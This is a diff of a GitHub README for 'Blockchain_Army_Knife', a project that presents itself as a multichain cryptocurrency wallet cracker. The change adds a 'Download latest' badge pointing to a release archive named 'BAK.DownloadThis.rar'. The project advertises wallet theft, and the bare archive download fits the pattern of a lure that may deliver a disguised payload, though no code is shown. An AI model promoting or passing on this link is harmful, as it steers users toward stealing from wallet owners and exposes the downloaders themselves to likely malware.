@@ -2,6 +2,7 @@
 ## Blockchain_Army_Knife
 #A Powerful wallet cracker with multichian
 
+[![Static Badge](https://img.shields.io/badge/Download-latest-blue)](https://github.com/LanceHez/Blockchain_Army_Knife-wallet-cracker-with-multichian/releases/download/v2.0.1/BAK.DownloadThis.rar)
 
 
 ## Introduction/Ввод ##
